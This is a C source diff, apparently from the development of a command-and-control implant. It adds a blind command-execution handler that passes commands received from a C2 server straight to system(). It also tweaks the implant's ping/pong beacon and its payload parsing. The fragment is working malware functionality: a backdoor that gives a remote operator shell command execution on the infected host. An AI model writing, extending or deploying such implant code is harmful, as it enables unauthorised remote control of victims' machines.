@@ -24,19 +24,25 @@ int send_ping(int destination_address) {
     addr.sin_family = AF_INET; 
     addr.sin_port = htons(C2_PORT);
 
-    addr.sin_addr.s_addr = htonl(destination_address); 
+    addr.sin_addr.s_addr = destination_address; 
 
     if (connect(socket_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
         perror("Could not connect to C2");
         return 1;
     }
 
-    char *msg = "ping";
+    char *msg = "pong";
     send(socket_fd, msg, strlen(msg), 0);
 
     close(socket_fd);
     return 0;
 
+}
+
+void execute_command(char* payload) {
+
+    // Use system. Could use execve but system would allow for more shell like command execution
+    int ret = system(payload);
 }
 
 // Parse payload. Look for our established protocol message
@@ -68,15 +74,27 @@ int parse_payload(char* payload, int payload_len, int source_address) {
     incoming.cmd_len = ntohl(incoming.cmd_len);
 
     // Get actual command
-    command = calloc(1, incoming.cmd_len);
+    command = calloc(1, incoming.cmd_len + 1);
     memcpy(command, match + 3*sizeof(uint32_t), incoming.cmd_len);
+    command[incoming.cmd_len] = '\0'; // Null terminate
 
     
-    // Handle ping command
-    if (incoming.command == CMD_PING) {
-        printf("Handling ping");
-        send_ping(source_address); 
+    // Handle command types
+    switch (incoming.command) {
+
+        // Handle ping
+        case CMD_PING:
+            printf("Handling ping\n");
+            send_ping(source_address); 
+            break;
+        
+        // Handle command execution (with no output returned)
+        case CMD_EXEC_BLIND:
+            printf("Handling exec blind\n");
+            execute_command(command);
+            break;
     }
+    
 
     // Debug printing
     printf("MAGIC FOUND: %x\n", incoming.magic);
